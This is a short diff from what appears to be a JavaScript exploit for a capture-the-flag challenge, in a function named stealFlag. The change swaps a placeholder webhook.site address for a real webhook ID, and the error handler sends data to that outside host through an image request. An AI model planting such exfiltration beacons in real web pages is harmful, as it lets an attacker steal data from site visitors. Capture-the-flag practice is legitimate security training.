@@ -47,7 +47,7 @@ async function stealFlag() {
         console.error("Exploit failed:", error);
         
         // Send error to webhook
-        const webhookUrl = 'https://webhook.site/YOUR-WEBHOOK-ID';
+        const webhookUrl = 'https://webhook.site/ec478dd5-ba0d-4a39-805c-67faa2025381';
         const img = new Image();
         img.src = webhookUrl + '?error=' + encodeURIComponent(error.toString());
     }
